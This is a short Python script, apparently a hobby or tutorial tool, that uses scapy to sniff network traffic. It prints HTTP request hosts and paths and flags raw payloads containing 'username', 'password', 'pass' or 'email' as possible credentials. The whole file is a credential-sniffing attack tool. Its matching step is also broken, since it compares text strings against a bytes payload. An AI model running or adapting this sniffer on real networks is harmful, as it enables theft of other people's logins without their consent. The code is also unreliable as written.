from scapy.all import *
from scapy.layers import http
from scapy.all import IP

def sniff_packet():
    sniff(store=False, prn=process_packet)

def process_packet(packet):

    # FOR SNIFFING ALL KIND OF PACKETS

    # if packet.haslayer(IP):
    #     src_ip = packet[IP].src
    #     dst_ip = packet[IP].dst
    #     print(f"[+] IP packet >> Srouce port : {src_ip}, Destination {dst_ip}")
    #
    # if packet.haslayer(TCP):
    #     src_port = packet[TCP].sport
    #     dst_port = packet[TCP].dport
    #
    # if packet.haslayer(Raw):
    #     load = packet[Raw].load
    #     print(f"[+] Raw packet >> {load}")

    #  FOR SNIFFING HTTP PACKETS ONLY

    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode('utf-8')
        path = packet[http.HTTPRequest].Path.decode('utf-8')
        print("[+] Http Request >>" + host + path)
        if packet.haslayer(Raw):
            try :
                load = packet[Raw].load
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load:
                        print("[+] Possible password/username >> " + load)
                        break
            except UnicodeError:
                print("[!] Unable to decode raw payload ")
sniff_packet()
